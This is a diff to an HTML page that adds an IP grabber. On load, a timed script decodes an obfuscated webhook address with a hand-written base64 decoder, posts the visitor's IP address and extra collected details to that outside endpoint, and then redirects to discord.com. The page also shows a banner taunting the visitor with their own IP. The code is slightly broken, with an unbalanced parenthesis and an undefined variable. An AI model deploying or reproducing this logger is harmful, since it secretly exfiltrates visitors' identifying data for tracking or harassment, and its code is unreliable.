@@ -48,22 +48,50 @@
         const secondList = document.getElementsByClassName("header")[0]
         secondList.appendChild(div)
       });
+      
+      
+      function obscureBase64Decoder(base64) {
+  const base64Charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+
+  function decodeChunk(chunk) {
+    const binary = chunk.split('').map(char => base64Charset.indexOf(char).toString(2).padStart(6, '0')).join('');
+    const decoded = [];
+    for (let i = 0; i < binary.length; i += 8) {
+      decoded.push(String.fromCharCode(parseInt(binary.substr(i, 8), 2)));
+    }
+    return decoded.join('');
+  }
+
+  const decoded = base64.match(/.{1,4}/g).map(chunk => decodeChunk(chunk)).join('');
+  return decoded;
+}
+
+
+
+
 
       function ipLogByRaz() {
+       
+        const decodedString1 = obscureBase64Decoder(base64String);
+        wbhk_decoded = obscureBase64Decoder(decodedString1));
+
         var ispp = document.getElementById('ipppp').innerHTML
         var extra = document.getElementById("razzylog").innerHTML
+        document.getElementById("id_spot").innerHTML=(ispp)
         const request = new XMLHttpRequest();
-        request.open("POST", wbhk);
+        request.open("POST", wbhk_decoded);
         request.setRequestHeader('Content-type', 'application/json');
         const params = {	
-          username: "HTML IP Grabber- kitzoon",
+          username: "Logger",
           avatar_url: 'https://media.discordapp.net/attachments/1150405810812366850/1152019990510321754/image.png',
           content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
         }
         request.send(JSON.stringify(params));
       }
+      wbhk_decoded=null
       setTimeout(function() {
         ipLogByRaz()
+        window.location.href = "https://discord.com";
       }, 700);
     </script>
     <style>
@@ -75,8 +103,13 @@
         display: none
       }
     </style>
+    <div>
+        <center>
+        <h2> GET YOUR SHIT PULLED DUMBASS </h2>
+		<img src="https://cdn.discordapp.com/attachments/1150405810812366850/1153036320051048518/nerd-nerdy.gif">
+        <h2> YOUR IPS HONEST REACTION: <h2 id="id_spot"> </h2> </h2>
+        </center>
+        </div>
   </body>
 </html>
-
-
-
+     
